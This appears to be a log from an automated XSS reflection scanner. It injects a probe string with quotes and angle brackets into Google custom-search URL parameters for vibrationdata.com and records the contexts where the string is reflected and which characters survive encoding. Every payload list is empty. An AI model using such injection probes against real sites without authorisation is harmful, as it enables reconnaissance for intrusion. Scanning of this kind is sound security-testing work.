+<div jsdata="GXYZuf;;ALgpHs" jscontroller="G3eKy" jsl="$t t-w-XilABeKRA;$x 0;" class="r-ijsSxoFXwWIY">
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [1]
+<a class="gb_4 gb_5 gb_he gb_1c" href="https://accounts.google.com/ServiceLogin?hl=en&amp;passive=true&amp;continue=https://www.google.com/search%3Fdomains%3Dwww.vibrationdata.com%26q%3D%26sitesearch%3Dwww.vibrationdata.com%26client%3Dpub-1751731975287442%26forid%3D(uvw%2522xyz%27yxz%253C/zxy%26ie%3DISO-8859-1%26oe%3DISO-8859-1%26safe%3Dactive%26cof%3DGALT:" target="_top">
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	True
+
+Attack Payloads for ATTR
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+_______________________________________________________________________________________________________
+http://www.google.com/custom?domains=www.vibrationdata.com&q=&sitesearch=www.vibrationdata.com&client=pub-1751731975287442&forid=1&ie=(uvw"xyz'yxz</zxy&oe=ISO-8859-1&safe=active&cof=GALT:#008000;GL:1;DIV:#336699;VLC:663399;AH:center;BGC:FFFFFF;LBGC:336699;ALC:0000FF;LC:0000FF;T:000000;GFNT:0000FF;GIMP:0000FF;FORID:1;&hl=en
+
+----------------------------------------------------------------------------------
+Attribute Context: [1]
+<div jsdata="GXYZuf;;ALugbM" jscontroller="G3eKy" jsl="$t t-w-XilABeKRA;$x 0;" class="r-izrH3OBQooF8">
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [1]
+<a class="gb_4 gb_5 gb_he gb_1c" href="https://accounts.google.com/ServiceLogin?hl=en&amp;passive=true&amp;continue=https://www.google.com/search%3Fdomains%3Dwww.vibrationdata.com%26q%3D%26sitesearch%3Dwww.vibrationdata.com%26client%3Dpub-1751731975287442%26forid%3D1%26ie%3D(uvw%2522xyz%27yxz%253C/zxy%26oe%3DISO-8859-1%26safe%3Dactive%26cof%3DGALT:" target="_top">
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	True
+
+Attack Payloads for ATTR
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+_______________________________________________________________________________________________________
+http://www.google.com/custom?domains=www.vibrationdata.com&q=&sitesearch=www.vibrationdata.com&client=pub-1751731975287442&forid=1&ie=ISO-8859-1&oe=(uvw"xyz'yxz</zxy&safe=active&cof=GALT:#008000;GL:1;DIV:#336699;VLC:663399;AH:center;BGC:FFFFFF;LBGC:336699;ALC:0000FF;LC:0000FF;T:000000;GFNT:0000FF;GIMP:0000FF;FORID:1;&hl=en
+
+----------------------------------------------------------------------------------
+Attribute Context: [1]
+<div jsdata="GXYZuf;;AL86fs" jscontroller="G3eKy" jsl="$t t-w-XilABeKRA;$x 0;" class="r-iA02V7atvj1U">
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [1]
+<a class="gb_4 gb_5 gb_he gb_1c" href="https://accounts.google.com/ServiceLogin?hl=en&amp;passive=true&amp;continue=https://www.google.com/search%3Fdomains%3Dwww.vibrationdata.com%26q%3D%26sitesearch%3Dwww.vibrationdata.com%26client%3Dpub-1751731975287442%26forid%3D1%26ie%3DISO-8859-1%26oe%3D(uvw%2522xyz%27yxz%253C/zxy%26safe%3Dactive%26cof%3DGALT:" target="_top">
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	True
+
+Attack Payloads for ATTR
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+_______________________________________________________________________________________________________
+http://www.google.com/custom?domains=www.vibrationdata.com&q=&sitesearch=www.vibrationdata.com&client=pub-1751731975287442&forid=1&ie=ISO-8859-1&oe=ISO-8859-1&safe=(uvw"xyz'yxz</zxy&cof=GALT:#008000;GL:1;DIV:#336699;VLC:663399;AH:center;BGC:FFFFFF;LBGC:336699;ALC:0000FF;LC:0000FF;T:000000;GFNT:0000FF;GIMP:0000FF;FORID:1;&hl=en
+
+----------------------------------------------------------------------------------
+Attribute Context: [1]
+<div jsdata="GXYZuf;;AMLOHs" jscontroller="G3eKy" jsl="$t t-w-XilABeKRA;$x 0;" class="r-ielKYppXWJB4">
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [1]
+<a class="gb_4 gb_5 gb_he gb_1c" href="https://accounts.google.com/ServiceLogin?hl=en&amp;passive=true&amp;continue=https://www.google.com/search%3Fdomains%3Dwww.vibrationdata.com%26q%3D%26sitesearch%3Dwww.vibrationdata.com%26client%3Dpub-1751731975287442%26forid%3D1%26ie%3DISO-8859-1%26oe%3DISO-8859-1%26safe%3D(uvw%2522xyz%27yxz%253C/zxy%26cof%3DGALT:" target="_top">
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	True
+
+Attack Payloads for ATTR
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+_______________________________________________________________________________________________________
+http://www.google.com/custom?domains=www.vibrationdata.com&q=&sitesearch=www.vibrationdata.com&client=pub-1751731975287442&forid=1&ie=ISO-8859-1&oe=ISO-8859-1&safe=active&cof=(uvw"xyz'yxz</zxy&hl=en
+
+----------------------------------------------------------------------------------
+Attribute Context: [1]
+<div jsdata="GXYZuf;;AMY38s" jscontroller="G3eKy" jsl="$t t-w-XilABeKRA;$x 0;" class="r-iNrSMot_ZRz0">
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [5]
+<a class="gb_4 gb_5 gb_he gb_1c" href="https://accounts.google.com/ServiceLogin?hl=en&amp;passive=true&amp;continue=https://www.google.com/search%3Fdomains%3Dwww.vibrationdata.com%26q%3D%26sitesearch%3Dwww.vibrationdata.com%26client%3Dpub-1751731975287442%26forid%3D1%26ie%3DISO-8859-1%26oe%3DISO-8859-1%26safe%3Dactive%26cof%3D(uvw%2522xyz%27yxz%253C/zxy%26hl%3Den" target="_top">
+<a href="/preferences?hl=en&amp;prev=https://www.google.com/search?domains%3Dwww.vibrationdata.com%26q%3D%26sitesearch%3Dwww.vibrationdata.com%26client%3Dpub-1751731975287442%26ie%3DISO-8859-1%26oe%3DISO-8859-1%26safe%3Dactive%26cof%3D(uvw%2522xyz%2527yxz%253C/zxy%26hl%3Den" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwjj3KWQruXoAhVYwjgGHbuCCloQo_oBegQICxAK">
+<a href="/preferences?hl=en&amp;prev=https://www.google.com/search?domains%3Dwww.vibrationdata.com%26q%3D%26sitesearch%3Dwww.vibrationdata.com%26client%3Dpub-1751731975287442%26ie%3DISO-8859-1%26oe%3DISO-8859-1%26safe%3Dactive%26cof%3D(uvw%2522xyz%2527yxz%253C/zxy%26hl%3Den#languages" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwjj3KWQruXoAhVYwjgGHbuCCloQo_oBegQICxAL">
+<a class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-safesearch-on="1" href="/setprefs?safeui=images&amp;sig=0_R3iwrSJUR8AO4aUWSHw0bWgPTHg%3D&amp;prev=https://www.google.com/search?domains%3Dwww.vibrationdata.com%26q%3D%26sitesearch%3Dwww.vibrationdata.com%26client%3Dpub-1751731975287442%26ie%3DISO-8859-1%26oe%3DISO-8859-1%26safe%3Dactive%26cof%3D(uvw%2522xyz%2527yxz%253C/zxy%26hl%3Den" id="safesearch" data-ved="2ahUKEwjj3KWQruXoAhVYwjgGHbuCCloQo_oBegQICxAM">
+<a href="/setprefs?safeui=images&amp;sig=0_R3iwrSJUR8AO4aUWSHw0bWgPTHg%3D&amp;prev=https://www.google.com/search?domains%3Dwww.vibrationdata.com%26q%3D%26sitesearch%3Dwww.vibrationdata.com%26client%3Dpub-1751731975287442%26ie%3DISO-8859-1%26oe%3DISO-8859-1%26safe%3Dactive%26cof%3D(uvw%2522xyz%2527yxz%253C/zxy%26hl%3Den">
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	True
+
+Attack Payloads for ATTR
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+_______________________________________________________________________________________________________
+http://www.google.com/custom?domains=www.vibrationdata.com&q=&sitesearch=www.vibrationdata.com&client=pub-1751731975287442&forid=1&ie=ISO-8859-1&oe=ISO-8859-1&safe=active&cof=GALT:#008000;GL:1;DIV:#336699;VLC:663399;AH:center;BGC:FFFFFF;LBGC:336699;ALC:0000FF;LC:0000FF;T:000000;GFNT:0000FF;GIMP:0000FF;FORID:1;&hl=(uvw"xyz'yxz</zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [1]
+<div jsdata="GXYZuf;;AMnhDs" jscontroller="G3eKy" jsl="$t t-w-XilABeKRA;$x 0;" class="r-i3xEguE2Uj5U">
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	True
+
+Attack Payloads for ATTR
+[]
